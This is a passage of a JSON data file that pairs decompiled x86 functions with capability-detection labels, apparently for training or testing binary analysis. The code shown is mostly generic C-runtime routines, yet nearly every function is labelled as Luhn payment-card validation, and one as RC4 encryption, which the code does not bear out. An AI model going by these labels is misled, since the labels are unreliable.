            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004121c8(uchar *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uchar *var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    \n    var_1ch = arg_ch;\n    var_14h = 0x42;\n    var_18h = arg_8h;\n    var_20h = arg_8h;\n    uVar1 = fcn.00415cc0(&var_20h, arg_10h, &arg_14h);\n    if (arg_8h != NULL) {\n        var_1ch = var_1ch + -1;\n        if (var_1ch < 0) {\n            fcn.00415afa(0, &var_20h);\n        }\n        else {\n            *var_20h = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 227
    },
    "00412297": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00412297(uint param_1)\n\n{\n    int32_t iVar1;\n    code **ppcVar2;\n    \n    if (*0x4640a8 != NULL) {\n        (**0x4640a8)(param_1);\n    }\n    iVar1 = 0;\n    ppcVar2 = 0x463078;\n    do {\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*ppcVar2 != NULL) {\n            iVar1 = (**ppcVar2)();\n        }\n        ppcVar2 = ppcVar2 + 1;\n    } while (ppcVar2 < 0x46308c);\n    if (iVar1 == 0) {\n        fcn.004114b5(0x41842d);\n        ppcVar2 = 0x463000;\n        do {\n            if (*ppcVar2 != NULL) {\n                (**ppcVar2)();\n            }\n            ppcVar2 = ppcVar2 + 1;\n        } while (ppcVar2 < 0x463074);\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 256
    },
    "0041263c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041263c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint arg_ch_00;\n    \n    arg_ch_00 = 0xc;\n    fcn.00412580();\n    *(unaff_EBP + -0x1c) = 0;\n    iVar2 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + 8) = *(unaff_EBP + 8) + iVar2 * *(unaff_EBP + 0x10);\n    *(unaff_EBP + -4) = 0;\n    while( true ) {\n        piVar1 = unaff_EBP + 0x10;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 < 0) break;\n        *(unaff_EBP + 8) = *(unaff_EBP + 8) - iVar2;\n        (**(unaff_EBP + 0x14))();\n    }\n    *(unaff_EBP + -0x1c) = 1;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00412684(0x455df0, arg_ch_00, unaff_retaddr, arg_8h);\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 362
    },
    "00412f9d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00412f9d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    uint arg_ch_00;\n    \n    arg_ch_00 = 0x10;\n    fcn.00412580();\n    *(unaff_EBP + -0x20) = 0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x1c) = 0;\n    while (*(unaff_EBP + -0x1c) < *(unaff_EBP + 0x10)) {\n        iVar1 = *(unaff_EBP + 8);\n        (**(unaff_EBP + 0x14))();\n        *(unaff_EBP + 8) = iVar1 + *(unaff_EBP + 0xc);\n        *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 1;\n    }\n    *(unaff_EBP + -0x20) = 1;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00412fe7(0x455e40, arg_ch_00, unaff_retaddr, arg_8h, arg_ch);\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 355
    },
    "00413130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413130(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00414501();\n    iVar1 = *(iVar1 + 0x60);\n    if (iVar1 != *0x46870c) {\n        iVar1 = fcn.00412c04();\n    }\n    fcn.004130b9(iVar1, param_1, param_2);\n    return;\n}\n",
        "token_count": 103
    },
    "004131ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004131ce(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00414501();\n    iVar1 = *(iVar1 + 0x60);\n    if (iVar1 != *0x46870c) {\n        iVar1 = fcn.00412c04();\n    }\n    fcn.00413157(iVar1, param_1, param_2);\n    return;\n}\n",
        "token_count": 102
    },
    "004131f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004131f5(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00414501();\n    return iVar1 + 8;\n}\n",
        "token_count": 42
    },
    "004131fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004131fe(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00414501();\n    return iVar1 + 0xc;\n}\n",
        "token_count": 42
    },
    "00413c98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00413c98(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_10h_00;\n    int32_t unaff_EBP;\n    uint var_50h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.00412580(0x455ea8, 0x40);\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    iVar3 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x20) = arg_10h_00;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x38) = *(arg_8h_00 + -4);\n    uVar1 = fcn.00410c02(unaff_EBP + -0x50, *(iVar3 + 0x18));\n    *(unaff_EBP + -0x3c) = uVar1;\n    iVar2 = fcn.00414501();\n    *(unaff_EBP + -0x40) = *(iVar2 + 0x7c);\n    iVar2 = fcn.00414501();\n    *(unaff_EBP + -0x44) = *(iVar2 + 0x80);\n    iVar2 = fcn.00414501();\n    *(iVar2 + 0x7c) = iVar3;\n    iVar3 = fcn.00414501();\n    *(iVar3 + 0x80) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -4) = 1;\n    uVar1 = fcn.00410c97(arg_8h_00, *(unaff_EBP + 0x14), arg_10h_00, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c));\n    *(unaff_EBP + -0x20) = uVar1;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00413ded();\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 607
    },
    "00416585": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00416585(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t arg_8h_00;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00412580(0x456000, 8);\n    piVar1 = *(unaff_EBP + 8) * 8 + 0x464390;\n    if (*piVar1 == 0) {\n        arg_8h_00 = fcn.0041101f(0x18);\n        if (arg_8h_00 == 0) {\n            puVar2 = fcn.004131f5();\n            *puVar2 = 0xc;\n        }\n        else {\n            fcn.00416625(10);\n            *(unaff_EBP + -4) = 0;\n            if (*piVar1 == 0) {\n                iVar3 = fcn.0041c315(arg_8h_00, 4000);\n                if (iVar3 == 0) {\n                    fcn.00411031(arg_8h_00);\n                    puVar2 = fcn.004131f5();\n                    *puVar2 = 0xc;\n                    fcn.00410d32(unaff_EBP + -0x10, 0xffffffff);\n                    goto code_r0x00416616;\n                }\n                *piVar1 = arg_8h_00;\n            }\n            else {\n                fcn.00411031(arg_8h_00);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0041661c();\n        }\n    }\ncode_r0x00416616:\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 440
    },
    "00416ae6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.00416ae6(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    if (*0x4686e8 == *0x4686f8) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x468700, 0, *0x4686ec, (*0x4686f8 * 5 + 0x50) * 4);\n        if (iVar2 == 0) {\n            return NULL;\n        }\n        *0x4686f8 = *0x4686f8 + 0x10;\n        *0x4686ec = iVar2;\n    }\n    puVar1 = *0x4686ec + *0x4686e8 * 0x14;\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x468700, 8, 0x41c4);\n    puVar1[4] = iVar2;\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x100000, 0x2000, 4);\n        puVar1[3] = iVar2;\n        if (iVar2 != 0) {\n            puVar1[2] = 0xffffffff;\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            *0x4686e8 = *0x4686e8 + 1;\n            *puVar1[4] = 0xffffffff;\n            return puVar1;\n        }\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x468700, 0, puVar1[4]);\n    }\n    return NULL;\n}\n",
        "token_count": 388
    },
    "004183e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004183e9(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00412580(0x456418, 0xc);\n    *(unaff_EBP + -0x1c) = 0x45c780;\n    while (*(unaff_EBP + -0x1c) < 0x45c780) {\n        *(unaff_EBP + -4) = 0;\n        if (**(unaff_EBP + -0x1c) != NULL) {\n            (***(unaff_EBP + -0x1c))();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n    }\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 222
    },
    "00419100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.00419100(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar4 = param_1 & 3;\n    puVar3 = param_1;\n    while (uVar4 != 0) {\n        uVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        if (uVar1 == 0) goto code_r0x00419153;\n        uVar4 = puVar3 & 3;\n    }\n    do {\n        do {\n            puVar5 = puVar3;\n            puVar3 = puVar5 + 1;\n        } while (((*puVar5 ^ 0xffffffff ^ *puVar5 + 0x7efefeff) & 0x81010100) == 0);\n        uVar4 = *puVar5;\n        if (uVar4 == '\\0') goto code_r0x00419165;\n        if (uVar4 >> 8 == '\\0') {\n            puVar5 = puVar5 + 1;\n            goto code_r0x00419165;\n        }\n        if ((uVar4 & 0xff0000) == 0) {\n            puVar5 = puVar5 + 2;\n            goto code_r0x00419165;\n        }\n    } while ((uVar4 & 0xff000000) != 0);\ncode_r0x00419153:\n    puVar5 = puVar3 + -1;\ncode_r0x00419165:\n    uVar4 = param_2 & 3;\n    while (uVar4 != 0) {\n        uVar1 = *param_2;\n        uVar4 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x004191e0;\n        *puVar5 = uVar1;\n        puVar5 = puVar5 + 1;\n        uVar4 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar4 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar4 == '\\0') {\ncode_r0x004191e0:\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if (uVar4 >> 8 == '\\0') {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if ((uVar4 & 0xff0000) == 0) {\n                *puVar5 = uVar4;\n                *(puVar5 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar4 & 0xff000000) == 0) {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n        }\n        *puVar5 = uVar4;\n        puVar5 = puVar5 + 1;\n    } while( true );\n}\n",
        "token_count": 745
    },
    "004190f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.004190f0(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    uVar3 = param_2 & 3;\n    puVar4 = param_1;\n    while (uVar3 != 0) {\n        uVar1 = *param_2;\n        uVar3 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x004191e0;\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        uVar3 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar3 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar3 == '\\0') {\ncode_r0x004191e0:\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if (uVar3 >> 8 == '\\0') {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if ((uVar3 & 0xff0000) == 0) {\n                *puVar4 = uVar3;\n                *(puVar4 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar3 & 0xff000000) == 0) {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n        }\n        *puVar4 = uVar3;\n        puVar4 = puVar4 + 1;\n    } while( true );\n}\n",
        "token_count": 439
    },
    "004191e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t __cdecl fcn.004191e8(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint noname_2;\n    int32_t iVar1;\n    uint32_t in_ECX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint32_t var_4h;\n    \n    if (arg_ch + 1 < 0x101) {\n        arg_ch._2_2_ = *(*(arg_8h + 0x48) + arg_ch * 2);\n    }\n    else {\n        if ((*(*(arg_8h + 0x48) + 1 + (arg_ch >> 8 & 0xffU) * 2) & 0x80) == 0) {\n            var_4h = in_ECX & 0xffff0000 | arg_ch & 0xff;\n            noname_2 = 1;\n        }\n        else {\n            var_4h = CONCAT11(arg_ch, arg_ch >> 8);\n            var_4h = in_ECX & 0xff000000 | var_4h;\n            noname_2 = 2;\n        }\n        iVar1 = fcn.0041a164(1, &var_4h, noname_2, &arg_ch + 2, *(arg_8h + 4), *(arg_8h + 0x14), 1, var_4h, unaff_EBP, \n                             unaff_retaddr, arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return arg_ch._2_2_ & arg_10h;\n}\n",
        "token_count": 429
    },
    "00419426": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00419426(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    if (0 < param_2) {\n        puVar1 = &param_2;\n        iVar2 = param_2;\n        do {\n            puVar1 = puVar1 + 1;\n            fcn.00419100(param_1, *puVar1);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "004195af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.004195af(void)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    bVar1 = true;\n    if (*0x4647ac == NULL) {\n        *0x4647ac = fcn.0041101f(0x351);\n        if (*0x4647ac == NULL) {\n            return NULL;\n        }\n    }\n    **0x4647ac = 0;\n    fcn.00419426(*0x4647ac, 3, *0x4647b4, 0x4567c4, *0x4647b8);\n    puVar3 = 0x4647b8;\n    do {\n        fcn.00419100(*0x4647ac, 0x4520f8);\n        puVar4 = puVar3 + 3;\n        iVar2 = fcn.00418650(*puVar3, *puVar4);\n        if (iVar2 != 0) {\n            bVar1 = false;\n        }\n        fcn.00419426(*0x4647ac, 3, puVar3[2], 0x4567c4, *puVar4);\n        puVar3 = puVar4;\n    } while (puVar4 < 0x4647e8);\n    if (!bVar1) {\n        return *0x4647ac;\n    }\n    fcn.00411031(*0x4647ac);\n    *0x4647ac = NULL;\n    return *0x4647c4;\n}\n",
        "token_count": 355
    },
    "0041aa6b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nbool fcn.0041aa6b(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *unaff_EBX;\n    uint32_t uVar6;\n    \n    if (*0x464804 == 0) {\n        return false;\n    }\n    iVar1 = unaff_EBX[5];\n    if ((iVar1 != *0x464898) || (iVar1 != *0x4648a4)) {\n        if (*0x4674a4 == 0) {\n            fcn.0041a8b3(1, 1, iVar1, 1, 0, 0, 0, 0, 0);\n            fcn.0041a8b3(0, 1, iVar1, 5, 0, 0, 0, 0, 0);\n        }\n        else {\n            if (*0x467490 != 0) {\n                uVar6 = *0x467496;\n                uVar3 = 0;\n                uVar4 = 0;\n            }\n            else {\n                uVar3 = *0x467494;\n                uVar6 = 0;\n                uVar4 = *0x467496;\n            }\n            fcn.0041a8b3(1, *0x467490 == 0, iVar1, uVar4, uVar3, uVar6, *0x46749a, *0x46749c, *0x46749e);\n            if (*0x46743c != 0) {\n                uVar6 = *0x467442;\n                uVar3 = 0;\n                uVar4 = 0;\n            }\n            else {\n                uVar3 = *0x467440;\n                uVar6 = 0;\n                uVar4 = *0x467442;\n            }\n            fcn.0041a8b3(0, *0x46743c == 0, iVar1, uVar4, uVar3, uVar6, *0x467446, *0x467448, *0x46744a);\n        }\n    }\n    iVar1 = unaff_EBX[7];\n    if (*0x46489c < *0x4648a8) {\n        if ((iVar1 < *0x46489c) || (*0x4648a8 < iVar1)) {\n            return false;\n        }\n        if ((*0x46489c < iVar1) && (iVar1 < *0x4648a8)) {\n            return true;\n        }\n    }\n    else {\n        if (iVar1 < *0x4648a8) {\n            return true;\n        }\n        if (*0x46489c < iVar1) {\n            return true;\n        }\n        if ((*0x4648a8 < iVar1) && (iVar1 < *0x46489c)) {\n            return false;\n        }\n    }\n    iVar5 = ((unaff_EBX[2] * 0x3c + unaff_EBX[1]) * 0x3c + *unaff_EBX) * 1000;\n    if (iVar1 == *0x46489c) {\n        bVar2 = *0x4648a0 <= iVar5;\n    }\n    else {\n        bVar2 = iVar5 < *0x4648ac;\n    }\n    return bVar2;\n}\n",
        "token_count": 763
    },
    "0041b4fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b4fe(uint param_1, uint param_2)\n\n{\n    fcn.0041b3a6(param_1, param_2, 0x46492c);\n    return;\n}\n",
        "token_count": 50
    },
    "0041b514": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b514(uint param_1, uint param_2)\n\n{\n    fcn.0041b3a6(param_1, param_2, 0x464944);\n    return;\n}\n",
        "token_count": 48
    },
    "0041b5a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b5a6(uint arg_8h, uint arg_ch)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    fcn.0041f2f6(&var_10h, &var_14h, arg_ch, 0, 0, 0, 0);\n    fcn.0041b4fe(&var_10h, arg_8h);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 130
    },
    "0041b5e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b5e3(uint arg_8h, uint arg_ch)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    fcn.0041f2f6(&var_10h, &var_14h, arg_ch, 1, 0, 0, 0);\n    fcn.0041b52a(&var_10h, arg_8h);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 130
    },
    "0041b621": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b621(uint arg_8h, uint arg_ch)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    fcn.0041f2f6(&var_10h, &var_14h, arg_ch, 0, 0, 0, 0);\n    fcn.0041b514(&var_10h, arg_8h);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 127
    },
    "0041b65e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b65e(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char *arg_ch_00;\n    char *arg_8h_00;\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char cVar4;\n    \n    arg_8h_00 = arg_8h;\n    pcVar3 = *(arg_10h + 0xc);\n    arg_ch_00 = arg_8h + 1;\n    *arg_8h = '0';\n    pcVar1 = arg_ch_00;\n    if (0 < arg_ch) {\n        arg_8h = arg_ch;\n        arg_ch = 0;\n        do {\n            cVar4 = *pcVar3;\n            if (cVar4 == '\\0') {\n                cVar4 = '0';\n            }\n            else {\n                pcVar3 = pcVar3 + 1;\n            }\n            *pcVar1 = cVar4;\n            pcVar1 = pcVar1 + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != NULL);\n    }\n    *pcVar1 = '\\0';\n    if ((-1 < arg_ch) && ('4' < *pcVar3)) {\n        while (pcVar1 = pcVar1 + -1,  *pcVar1 == '9') {\n            *pcVar1 = '0';\n        }\n        *pcVar1 = *pcVar1 + '\\x01';\n    }\n    if (*arg_8h_00 == '1') {\n        *(arg_10h + 4) = *(arg_10h + 4) + 1;\n    }\n    else {\n        iVar2 = fcn.00411cb0(arg_ch_00);\n        fcn.004105b0(arg_8h_00, arg_ch_00, iVar2 + 1);\n    }\n    return;\n}\n",
        "token_count": 439
    },
    "0041b78f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041b78f(uint arg_8h, uint noname_1, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint in_stack_ffffffb8;\n    ushort uVar4;\n    uint var_2ch;\n    uchar var_28h [24];\n    uint var_10h;\n    uint uStack16;\n    ushort uStack12;\n    uint var_4h;\n    \n    uVar4 = in_stack_ffffffb8 >> 0x10;\n    var_4h = *0x4640c8;\n    fcn.0041b6d5(&var_10h, &arg_8h);\n    iVar3 = fcn.0041f776(var_10h, uStack16, CONCAT22(uVar4, uStack12), 0x11, 0, &var_2ch);\n    iVar2 = arg_14h;\n    piVar1 = arg_10h;\n    arg_10h[2] = iVar3;\n    *arg_10h = var_2ch._2_1_;\n    arg_10h[1] = var_2ch;\n    fcn.004190f0(arg_14h, var_28h);\n    piVar1[3] = iVar2;\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 333
    },
    "0041bc43": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041bc43(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00414501();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x46466c) {\n        iVar1 = fcn.00419574();\n    }\n    fcn.0041bb83(iVar1, param_1, param_2, param_3);\n    return;\n}\n",
        "token_count": 110
    },
    "0041c247": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041c247(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00414501();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x46466c) {\n        iVar1 = fcn.00419574();\n    }\n    fcn.0041c1e7(iVar1, param_1, param_2);\n    return;\n}\n",
        "token_count": 103
    },
    "0041d3c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d3c2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00414501();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x46466c) {\n        iVar1 = fcn.00419574();\n    }\n    fcn.0041d2fd(iVar1, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 139
    },
    "0041e344": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041e344(uint param_1, char *param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    \n    iVar1 = 0;\n    while (cVar2 = *param_2,  cVar2 != '\\0') {\n        param_2 = param_2 + 1;\n        if ((cVar2 < 'a') || ('f' < cVar2)) {\n            if (('@' < cVar2) && (cVar2 < 'G')) {\n                cVar2 = cVar2 + -7;\n            }\n        }\n        else {\n            cVar2 = cVar2 + -0x27;\n        }\n        iVar1 = (iVar1 + 0xffffffd) * 0x10 + cVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 185
    },
    "0041ea50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041ea50(char *arg_8h, char *arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    bool bVar8;\n    \n    uVar4 = arg_10h;\n    pcVar6 = arg_8h;\n    if (arg_10h != 0) {\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        iVar5 = arg_10h - uVar4;\n        do {\n            pcVar6 = arg_ch;\n            pcVar7 = arg_8h;\n            if (iVar5 == 0) break;\n            iVar5 = iVar5 + -1;\n            pcVar7 = arg_8h + 1;\n            pcVar6 = arg_ch + 1;\n            cVar1 = *arg_ch;\n            cVar2 = *arg_8h;\n            arg_ch = pcVar6;\n            arg_8h = pcVar7;\n        } while (cVar1 == cVar2);\n        uVar3 = pcVar6[-1];\n        arg_10h = 0;\n        bVar8 = uVar3 == pcVar7[-1];\n        if (uVar3 < pcVar7[-1] || bVar8) {\n            if (bVar8) {\n                return 0;\n            }\n            arg_10h = 0xfffffffe;\n        }\n        arg_10h = ~arg_10h;\n    }\n    return arg_10h;\n}\n",
        "token_count": 415
    },
